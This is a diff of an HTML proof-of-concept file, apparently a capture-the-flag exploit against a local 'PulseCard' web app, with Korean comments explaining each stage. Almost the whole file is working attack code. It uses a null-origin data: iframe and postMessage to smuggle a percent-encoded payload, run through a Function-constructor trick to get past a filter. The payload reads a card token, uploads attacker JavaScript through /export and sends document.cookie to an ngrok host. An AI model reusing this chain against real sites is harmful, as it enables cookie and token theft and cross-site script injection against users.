@@ -1,14 +1,128 @@
 <!doctype html>
 <html>
 <body>
-  <h1>BOT TEST</h1>
-
-  <img src="https://biquarterly-keila-manifoldly.ngrok-free.dev">
+  <h1>PulseCard PoC</h1>
 
   <script>
-    new Image().src =
-      "https://https://biquarterly-keila-manifoldly.ngrok-free.dev/hit?from=script&cookie="
-      + encodeURIComponent(document.cookie);
+    const EXFIL = "https://biquarterly-keila-manifoldly.ngrok-free.dev/hit";
+    const LOCAL = "http://localhost:5000";
+
+    function beacon(q) {
+      new Image().src = EXFIL + "?" + q + "&t=" + Date.now();
+    }
+
+    beacon("stage=outer_loaded");
+
+    /*
+      preview iframe 안에서 /export 성공 후 widget 파일명을
+      top-level poc.html로 postMessage 해준다.
+      그러면 여기서 직접 top-level을 /review?widget=... 으로 이동시킨다.
+    */
+    window.addEventListener("message", (e) => {
+      if (!e.data || e.data.type !== "widget") return;
+
+      const name = e.data.name;
+      beacon("stage=exported&name=" + encodeURIComponent(name));
+
+      location.href = LOCAL + "/review?widget=" + encodeURIComponent(name);
+    });
+
+    /*
+      /review에서 실행될 최종 JS.
+      여기서 document.cookie를 읽어야 flag 쿠키가 보인다.
+    */
+    const widgetJS = `
+new Image().src = "https://biquarterly-keila-manifoldly.ngrok-free.dev/hit?stage=flag&c="
+  + encodeURIComponent(document.cookie);
+`;
+
+    /*
+      /preview에서 실행될 코드.
+      /export에 application/javascript로 widgetJS를 업로드하고,
+      생성된 파일명을 top-level poc.html로 보낸다.
+    */
+    const exportCode = `
+(async () => {
+  const js = ${JSON.stringify(widgetJS)};
+
+  let token = "";
+  try {
+    token = CARD_TOKEN;
+  } catch (e) {}
+
+  if (!token && self.CARD_TOKEN) {
+    token = self.CARD_TOKEN;
+  }
+
+  const r = await fetch("/export", {
+    method: "POST",
+    headers: {
+      "X-Card-Token": token,
+      "Content-Type": "application/javascript"
+    },
+    body: js
+  });
+
+  const name = await r.text();
+
+  top.postMessage({
+    type: "widget",
+    name: name
+  }, "*");
+})();
+`;
+
+    /*
+      preview 쪽 필터 우회용.
+      실제 코드를 %xx 형태로 숨긴 뒤 unescape로 복원해서 Function 생성자로 실행.
+    */
+    const encoded = Array.from(new TextEncoder().encode(exportCode))
+      .map(b => "%" + b.toString(16).padStart(2, "0"))
+      .join("");
+
+    const payload =
+      '[]["filter"]["con"+"structor"](unescape("' + encoded + '"))()';
+
+    /*
+      data: iframe은 origin이 null이 된다.
+      preview가 null origin의 postMessage를 받는 구조일 때 이 방식으로 전달한다.
+    */
+    const innerHTML = `
+<!doctype html>
+<html>
+<body>
+  <h1>inner</h1>
+
+  <img src="${EXFIL}?stage=inner_loaded">
+
+  <iframe
+    id="p"
+    src="${LOCAL}/preview"
+    style="width:1px;height:1px;border:0">
+  </iframe>
+
+  <script>
+    const payload = ${JSON.stringify(payload)};
+
+    function sendPayload() {
+      const f = document.getElementById("p");
+      f.contentWindow.postMessage(payload, "*");
+    }
+
+    document.getElementById("p").addEventListener("load", () => {
+      setTimeout(sendPayload, 300);
+      setTimeout(sendPayload, 1000);
+      setTimeout(sendPayload, 2500);
+    });
+  <\/script>
+</body>
+</html>
+`;
+
+    const stage = document.createElement("iframe");
+    stage.style = "width:1px;height:1px;border:0";
+    stage.src = "data:text/html;charset=utf-8," + encodeURIComponent(innerHTML);
+    document.body.appendChild(stage);
   </script>
 </body>
 </html>
